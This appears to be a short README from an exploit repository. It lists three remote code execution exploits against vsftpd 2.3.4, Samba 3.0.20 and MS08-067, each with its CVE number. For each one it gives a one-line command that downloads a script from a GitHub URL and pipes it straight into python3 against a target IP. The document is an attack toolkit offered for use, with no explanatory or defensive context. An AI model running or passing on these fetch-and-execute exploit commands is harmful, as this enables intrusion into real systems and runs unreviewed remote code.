this is lazy

vsftpd-2.3.4.py | vsftpd 2.3.4 - Backdoor Command Execution | CVE-2011-2523
```
curl -sS https://raw.githubusercontent.com/Y2FuZXBh/grey/main/rce/vsftpd-2.3.4.py | python3 - <IP> <Port>
```
samba-3.0.20.py | Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution | CVE-2007-2447
```
curl -sS https://raw.githubusercontent.com/Y2FuZXBh/grey/main/rce/samba-3.0.20.py | python3 - <IP> <NIC>
```
ms08-067.py | Microsoft Windows Server Service Crafted RPC Request Handling Remote Code Execution | CVE-2008-4250 | MS08-067
```
curl -sS https://raw.githubusercontent.com/Y2FuZXBh/grey/main/rce/ms08-067.py | python3 - -h
```